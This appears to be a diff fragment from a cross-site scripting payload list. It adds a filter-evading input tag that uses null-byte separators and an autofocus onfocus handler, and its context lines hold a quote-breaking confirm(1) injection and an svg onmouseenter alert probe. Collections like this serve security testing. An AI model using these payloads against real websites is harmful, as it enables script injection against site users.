@@ -1,3 +1,5 @@
+<input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`>
+
 \&#34;+confirm(1)+&#34;
 
 <svg onmouseenter="a=alert,a('xss')">
